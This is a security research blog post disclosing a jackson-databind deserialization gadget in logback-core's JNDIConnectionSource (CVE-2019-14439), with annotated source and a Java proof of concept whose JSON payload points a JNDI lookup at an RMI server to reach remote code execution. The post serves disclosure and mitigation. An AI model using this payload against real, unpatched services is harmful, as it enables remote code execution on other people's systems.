---
layout: post
title: "Attacking Unmarshallers :: JNDI Injection using Getter Based Deserialization Gadgets"
date: 2019-08-07 10:00:00 -0500
categories: blog
excerpt_separator: <!--more-->
---

<p class="cn" markdown="1">I know you have pwned deserialization of untrusted data bugs before (if you haven't what the hell, they are fun!), but have you pwned an entire REST framework due to a misconfigured marshaller? In this short blog post, we will reveal some quick research that was done based upon the excellent work perform by [Doyensec](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html).</p>
<!--more-->

<p class="cn">TL;DR</p>

<p class="cn" markdown="1">*In this post, I share another gadget chain for FasterXML's jackson-databind using the common logback-core library and not requiring any other libraries. This was a bug collison with [badcode of Knownsec 404 Team](https://twitter.com/80vul/status/1156766341946232832) and marked as CVE-2019-14439.*</p>

## Analysis

<p class="cn" markdown="1">During a quick audit of the logback-core library, I found a gadget chain for the ch.qos.logback.core.db.JNDIConnectionSource class literally the same package as the DriverManagerConnectionSource class</p>

{% include image.html
            img="assets/images/attacking-unmarshallers-jndi-injection-using-getter-based-deserialization/JNDIConnectionSource.png#2"
            title="Next to the DriverManagerConnectionSource class"
            caption="Next to the DriverManagerConnectionSource class"
            style="width:30%;height:30%" %}

<p class="cn" markdown="1">The setter for the class looks pretty standard for `jndiLocation`</p>

```java
/*  90 */   public void setJndiLocation(String jndiLocation) { this.jndiLocation = jndiLocation; }
```

<p class="cn" markdown="1">However, we trigger the `getConnection` method via `ObjectMapper.writeValueAsString` which is used to return JSON objects back to a user via a REST endpoint, we reach the following code:</p>

```java
/*     */   public Connection getConnection() throws SQLException {
/*  54 */     Connection conn = null;
/*     */     try {
/*  56 */       if (this.dataSource == null) {
/*  57 */         this.dataSource = lookupDataSource();         // 1
/*     */       }
```

<p class="cn" markdown="1">So if the dataSource property is not set, the code calls `JNDIConnectionSource.lookupDataSource` at *[1]*</p>

```java
/*     */   private DataSource lookupDataSource() throws NamingException, SQLException {
/*  94 */     addInfo("Looking up [" + this.jndiLocation + "] in JNDI");
/*     */     
/*  96 */     Context initialContext = new InitialContext();                    // 2
/*  97 */     Object obj = initialContext.lookup(this.jndiLocation);            // 3
/*     */ 
/*     */ 
/*     */     
/* 101 */     DataSource ds = (DataSource)obj;
/*     */     
/* 103 */     if (ds == null) {
/* 104 */       throw new SQLException("Failed to obtain data source from JNDI location " + this.jndiLocation);
/*     */     }
/* 106 */     return ds;
/*     */   }
```

<p class="cn" markdown="1">At *[2]* the code gets an instance of the InitialContext class and at *[3]* the code calls `InitialContext.lookup` using the attacker controlled `jndiLocation` property.</p>

<p class="cn" markdown="1">In a context dependant attack, where default typing is enabled for jackson-databind, this can result in JNDI Injection vulnerability.</p>

```java
import java.io.IOException;
import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class JacksonTest {
    public static void main(String[] args) throws JsonParseException, JsonMappingException, IOException {
        
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();

        StringBuilder d = new StringBuilder();
        d.append("[");
        d.append("\"ch.qos.logback.core.db.JNDIConnectionSource\"");
        d.append(",");
        d.append("{");
        d.append("\"jndiLocation\"");
        d.append(":");
        d.append("\"rmi://127.0.0.1:1097/rce\"");       // payload
        d.append("}");
        d.append("]");
 
        Object obj = objectMapper.readValue(d.toString(), java.lang.Object.class);          // trigger getters
        objectMapper.writeValueAsString(obj);                                               // trigger setters
    }
}
```

<p class="cn" markdown="1">There are multiple ways to achieve remote code execution via JNDI injection on older versions of Java using either class loading or attacking the Distrubuted Garbage Collection (DGC) for deserialization of untrusted data, techniques which are all taught in [Full Stack Web Attack](/training).</p> 

## Conclusion

<p class="cn" markdown="1">Getter based deserialization attacks are something to watch out for and can be mitigated by not using default typing. This is not a vulnerability to worry about since it has been patched and requires specific version of java to exploit.</p>

<p class="cn" markdown="1">It's interesting to note that the connection property doesn't exist at all in trhe `JNDIConnectionSource` class, even so, `getConnection` follows the Java bean convention and still gets called!</p>

<p class="cn" markdown="1">FasterXML continue to block individual classes and whilst I see the reasoning behind it, it makes for a cat and mouse game between attackers and defenders and I don't think that is the right approach.</p>

## References

<div markdown="1" class="cn">
- [https://blog.doyensec.com/2019/07/22/jackson-gadgets.html](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
- [https://github.com/FasterXML/jackson-databind/issues/2389](https://github.com/FasterXML/jackson-databind/issues/2389)
</div>
